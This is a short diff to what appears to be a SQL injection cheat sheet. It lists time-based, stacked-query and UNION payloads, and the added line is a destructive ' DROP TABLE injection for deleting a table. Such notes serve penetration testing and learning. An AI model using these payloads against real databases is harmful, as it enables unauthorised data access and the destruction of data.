@@ -34,6 +34,7 @@ SELECT cast(’123′ AS char);				- Casting
 ' or sleep(5); 	- Another example of testing whether time based SQL exists as a pause will occur before the page returns your request
 ' or 1=1; sleep(5);	- Stacking of queries
 ' UNION SELECT [query]	- This allows for return of addition information from oter tables you may not have had access from before
+' DROP TABLE table_name	- Used to delete a table
 
 #################
 # Extras	#
